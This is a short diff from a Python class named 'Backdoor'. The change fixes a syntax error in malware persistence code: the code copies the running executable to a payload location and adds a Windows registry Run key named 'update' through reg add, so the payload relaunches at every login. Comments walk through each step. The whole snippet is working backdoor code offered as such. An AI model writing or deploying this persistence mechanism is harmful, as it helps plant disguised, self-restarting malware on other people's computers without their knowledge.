@@ -20,7 +20,7 @@ class Backdoor:
         shutil.copyfile(sys.executable, payload_file_location) #sys.executable specifies executable;
         #if using python file, you'd use __file__
         #copy current payload file to new location
-        if not os.path.exists(payload_file_location) #if payload hasn't already been copied
+        if not os.path.exists(payload_file_location): #if payload hasn't already been copied
             subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + payload_file_location + '"', shell=True)      
             #wrap in double quotes so it will run correctly, ie /d "c:\example.exe"
             #import os
